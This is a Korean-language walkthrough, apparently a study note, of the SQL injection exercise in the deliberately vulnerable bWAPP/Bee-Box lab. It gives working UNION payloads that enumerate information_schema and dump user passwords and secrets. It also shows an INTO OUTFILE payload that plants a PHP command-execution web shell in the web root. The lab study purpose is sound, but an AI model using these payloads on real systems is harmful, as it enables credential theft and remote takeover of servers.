## SQL Injection(GET/search)

![Typora_mkexMVVA8o](https://user-images.githubusercontent.com/79683414/134788279-d70368d4-90f2-415b-96fb-9120fdc4835d.png)

## Index

- [Concept of SQL injection](#sql-injection-이란)

- [What is UNION?](#UNION-?)
- [low](#low)
- [medium/high](#medium/high)
- [Advanced](#advanced)

### _SQL Injection 이란_

사용자가 데이터를 입력하는(DB Query를 날리는)곳에 SQL 쿼리를 입력하여

개발자가 의도하지 않은 동작을 하는 것.

웹에서 사용자가 데이터를 입력할 수 있는 대부분의 것들은 DB와 연동되므로,

OWASP TOP10 에 항상 들어가는 취약점이다.

주로 `', UNION, #, --, OR` 등을 이용하여 위조된 Query를 보낸다.

이번 문제에서 이용되는 SQL Query 는 다음과 같을 것이다.

<br/>

<br>

`SELECT ???? FROM movies? WHERE title='<user_input>';`

<br>

<br>

따라서 Input 에 `' or 1=1` 을 입력하면 해당 테이블의 모든 튜플이 출력될 것이다.

하지만 해당 테이블에는 추가적으로 노출되는 정보가 없어서 적절하지 않다.

<br>

<br>

'or'을 이용한 공격은 "해당"테이블(movies?)의 모든 튜플을 출력하지만,

UNION을 이용하면 " __원하는 테이블__ "의 정보를 출력할 수 있다.

<br>

<br>

## UNION ?

UNION은,

복수의 SELECT 구문의 결과를 결합하여 하나로 반환한다.

조건은 각 SELECT 구문의 칼럼의 수(열의 개수, 차수, degree)가 같아야 한다.

내 방식대로 표현하자면,

<u>"SELECT의 결과"를 밑변을 기준으로 합치는 것</u>이다.

<br>

<br>

_칼럼의 수가 다른 경우_

![Hwp_Int2BuJ1pI](https://user-images.githubusercontent.com/79683414/134789893-86af1114-62da-4643-b260-06cfbbc1bd43.png)

<br>

<br>

_칼럼의 수가 같은 경우_

![Hwp_qdavP8mKoT](https://user-images.githubusercontent.com/79683414/134789902-59ba530f-c37c-4099-a7ad-05cd0fb0713e.png)

<br>

<br>

앞서 "UNION을 이용하면 원하는테이블의 정보를 출력할 수 있다"고 언급했는데,

이번 문제에서 사용된 쿼리를 보면서 이해해보자.

<br>

<br>

`SELECT ???(column) FROM ???(table) WHERE title='<user_input>'...`

<br>

<br>

Input으로 ` 0' UNION SELECT ??? FROM user ...#` 을 입력하면

쿼리는 다음과 같다.

`SELECT ???(column) From ???(table) WHERE title='0' UNION SELECT ??? FROM user ...#`

<br>

<br>

___두 SELECT 의 column의 수가 같다면___,

첫 번째 SELECT 의 결과는 EMPTY 이므로, 두 번째 SELECT 의, user table의 결과만 출력될 것이다.

따라서, 첫 번째 "SELECT 의 column 의 수" 만 알아내면 임의의 Table의 정보를 출력할 수 있게 된다.

임시로 테이블을 만들어서 직접 테스트 해보자.

<br>

<br>

![WindowsTerminal_7AUUlbLt3x](https://user-images.githubusercontent.com/79683414/134790651-b0d2b1a2-a8f4-4746-937e-6dc7bc4186d8.png)

Column의 수가 같으면 정상적으로 결합되지만 그렇지 않은 경우 Error 가 출력되는 것을 볼 수 있다.

앞부분에 0 을 붙이면 두 번째 SELECT 결과만 출력할 수 있다.

<br>

<br>

![WindowsTerminal_7WHyIDkWd4](https://user-images.githubusercontent.com/79683414/134790753-782bad8c-0a46-48e0-aca5-1fac985f7d23.png)

<br>

<br>

## low

우선, `', 'or 1=1#` 을 이용해서 SQL Injection 이 가능한지 확인해보자.

![chrome_dyz7a5u5uo](https://user-images.githubusercontent.com/79683414/134790794-2a8e75d9-439e-47a8-8cf6-d883da1deb3d.png)

![chrome_4WHYBTQLOF](https://user-images.githubusercontent.com/79683414/134790858-b05026ad-5613-4e22-96a5-3ddabfd22e97.png)

<br>

<br>



인젝션 공격이 가능하므로, "UNION" 을 이용해 Column 수를 확인해보자.

![chrome_EPDCLvpfUj](https://user-images.githubusercontent.com/79683414/134790906-57566386-27c0-4926-b8c9-f8b4c0e7e5c1.png)

<br>

<br>

참고로, 아래의 내용을 이용하여 정보를 수집할 수 있다.

```bash
database()		데이터베이스 이름
user()			현재 사용자의 아이디
system_user()		최고 권한 사용자의 아이디
@@version		데이터베이스 서버의 버전
@@datadir		데이터베이스 서버가 존재하는 디렉터리
```

`0'UNION SELECT 1,database(),user(),system_user(),@@version,6,7#`

![chrome_mYnO0ZvfZC](https://user-images.githubusercontent.com/79683414/134791179-3ec3d03b-6755-4e39-af56-af58e998d81f.png)

<br>

<br>

결과를 확인해보니 Column의 수는 7 이고 2,3,4,5의 결과를 출력하는 듯 하다.

Column의 수를 알아냈으니 이제 원하는 테이블의 정보를 출력할 수 있다.

여기서 출력할 테이블은 바로, MySQL 에서 기본적으로 내장되어있는 information_schema 이다.

information_schema 에는 여러가지 정보가 저장되어 있는데 그 중, 테이블의 이름, 칼럼명 등을 이용하면 계정정보, 비밀번호, 메일 등의 정보를 알아낼 수 있다.![WindowsTerminal_GDaud6c5L6](https://user-images.githubusercontent.com/79683414/134791408-e4040100-10f9-4992-ab33-d4807b0892ae.png)

> __Information_schema table reference__
>
> https://dev.mysql.com/doc/refman/8.0/en/information-schema-table-reference.html

<br>

<br>

information_schema.tables 에는 모든 테이블들의 이름이 저장된 "table_name" 칼럼이 있다.

`0' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables#`

![chrome_lXKA7Ckbwx](https://user-images.githubusercontent.com/79683414/134791485-70dca5d0-cc50-4276-870d-1aad9827c010.png)

<br>

<br>

이렇게 모든 테이블의 이름이 출력되는데, 계정 정보가 저장되어 있는 user 테이블을 확인해 보자.

information_schema.columns 에는 모든 테이블의 column 명이 저장된 column_name 칼럼이 있다.

`0' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='users'#`

![chrome_qDiDoal6g5](https://user-images.githubusercontent.com/79683414/134791580-d317428b-118e-4510-a1c1-b704820f05c5.png)



<br>

<br>

이렇게 user 테이블의 칼럼 정보를 획득했다.

다음은 원하는 정보를 출력해보자.

`0' UNION SELECT 1,concat(id,login),password,secret,email,activation_code,7 FROM users #`

![chrome_3PES9myt7j](https://user-images.githubusercontent.com/79683414/134791632-aa999466-cb17-43a4-934a-a7cab1666d98.png)

<br>

<br>

UNION 과 Information_schema 를 적절히 활용하면 원하는 정보를 획득 할 수 있다.

<br>

<br>

## medium/high

_sqli_1.php_

![Code_4gewNYMxPp](https://user-images.githubusercontent.com/79683414/135019163-81a73b95-4673-4cd6-808e-368cff48e36f.png)

<br>

_fuctions_external.php_

![notepad++_c2RB1s7NLp](https://user-images.githubusercontent.com/79683414/135019246-820f53aa-8c4d-44a2-96ea-687fadbe1ee9.png)

<br><br>

medium 과 high 에는 각각 addslashes(), mysql_real_escape_string() 이 적용되어 있다.

두 함수 모두 특정 문자의 앞에 backslash"\\"를 추가하여 escape 시킨다.

escape 시키는 문자는 `', ", \, NULL` 이 공통적이고

mysql_real_escape_string() 함수는 `\n, \r, \x1a` 를 추가로 escape 한다.

> addslashes() : https://www.php.net/manual/en/function.addslashes.php
>
> mysql_real_escape_string() : https://www.php.net/manual/en/function.mysql-real-escape-string.php



<br><br>

두 함수 모두 MySQL 에서 사용하는 특수문자를 SQL 문법으로 인식하지 못하도록 만들기 때문에 Injection 공격을 하는 것은 불가능하다.

<br><br>

## Advanced

이번 섹션에서 접한 Super 재밌는 내용이다. 응용할 내용은 다음 2가지이다.

- SELECT, OUTFILE
- Directory Listing

<br><br>

위의 UNION 실험에서 잠깐 나왔는데 SELECT 만 사용할 경우 결과를 그대로 반환한다.

이것을 응용하면

![WindowsTerminal_EkOTaUcDPm](https://user-images.githubusercontent.com/79683414/135023018-23c40c7e-8c36-45fd-b1a3-eb9b93393e96.png)

<br><br>

위와 같이 문자열을 그대로 반환한다.

위의 php 코드는 GET 파라매터의 cmd 변수의 값을 가져와 system() 함수로 실행시키는 내용이다.

<br><br>

"OUTFILE"의 경우 Query의 결과를 파일로 저장하는 명령어이다.

MySQL 의 `secure_file_priv` 옵션이 활성화된 경우, 해당 옵션에 지정된 경로에만 파일 생성이 가능하다.

현재 테스트 중인 DB의 `secure_file_priv` 옵션의 디폴트 값은 "/var/lib/mysql-files/" 이다.

![explorer_JT6CCOPSCV](https://user-images.githubusercontent.com/79683414/135024401-714f0cc0-2563-41a5-9072-89e26aed2d62.png)

<br>

Bee-Box에서 확인해본 결과 `secure_file_priv` 옵션이 비활성화 되어있어,

"OUTFILE"을 이용하여 원하는 경로에 파일을 생설할 수 있다.

<br><br>

Directory Listing 취약점은 URL에 특정 Directory를 입력했을 때(Directory이므로 `/` 로 끝난다.),

해당 경로의 모든 파일이 Listing 되는 취약점이다.

이 취약점이 발생했을 때 아래와 같이 상단에 "Index of ~~" 문자열이 출력된다. 

![WindowsTerminal_yAhitvN0Xf](https://user-images.githubusercontent.com/79683414/135023657-e3d9e22b-7f30-444b-9309-057382e2a95c.png)

<br><br>

위의 개념들을 이용해서 Injection 해보자.

"/bWAPP/images/"에 "sqli.php" 파일을 생성할 것이다.

`0' union select 1, "<?php system($_GET['cmd']) ?>",3,4,5,6,7 into outfile "/var/www/bWAPP/images/sqli.php" # `

![chrome_q29EndecYo](https://user-images.githubusercontent.com/79683414/135026604-59705f5f-db6e-404c-bc6a-d13ee3236fda.png)

<br><br>

Warning 이 뜨면서 Injection이 성공적으로 수행된 것을 보면

Bee-Box 의 DB에 `--secure-file-priv` 옵션이 비활성화 되어있는 듯 하다.

Directory listing 을 이용해 "sqli.php"파일이 생성되어있는지 확인해보자.

![chrome_YtcrfvD5vF](https://user-images.githubusercontent.com/79683414/135026920-87a0cff7-87cd-41fb-b170-a8cab379f186.png)

<br>

<br>

성공!!

이제 GET 방식을 이용해 "cmd" 변수에 원하는 명령을 입력해주면 된다.

![chrome_mFeFkvVlSI](https://user-images.githubusercontent.com/79683414/135027174-5bdc9301-a3de-45c9-b78f-0611a0b5da0a.png)
![chrome_Q6B7FHMfpr](https://user-images.githubusercontent.com/79683414/135027176-9240c59f-98b3-43f1-85dc-898f0bd98a48.png)
![chrome_jx7I1iojLx](https://user-images.githubusercontent.com/79683414/135027182-429bb594-94a9-4a68-8c54-39c1c1a44389.png)

